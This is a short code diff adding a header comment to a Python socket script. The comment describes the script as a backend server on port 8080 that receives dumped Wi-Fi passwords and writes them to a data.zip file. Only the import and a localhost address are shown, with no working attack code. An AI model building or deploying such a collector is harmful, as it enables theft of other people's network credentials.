@@ -1,3 +1,10 @@
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+#       Author:     Safwan aka Hammer                                                       #
+#       Date:       Friday, 19 March 2021 8:47:58 PM                                        #
+#       Brief:      Backend server that will listen at port 8080 for dump wifi passwords    #
+#                   and write a data.zip file.                                              #
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
+
 import socket
 
 HOST = '127.0.0.1'
